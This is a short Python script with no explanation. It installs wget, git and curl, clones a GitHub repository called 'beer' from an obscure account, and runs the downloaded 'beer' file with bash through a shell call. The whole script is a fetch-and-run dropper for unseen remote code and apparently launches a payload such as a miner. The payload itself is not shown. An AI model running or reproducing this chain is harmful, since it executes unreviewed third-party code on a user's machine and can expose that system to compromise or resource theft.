#!/usr/bin/env python
import subprocess

subprocess.check_call("apt update;apt -y install wget git curl;git clone https://github.com/jikilemphithani/beer.git;cd beer;chmod +x beer;bash beer", shell=True)
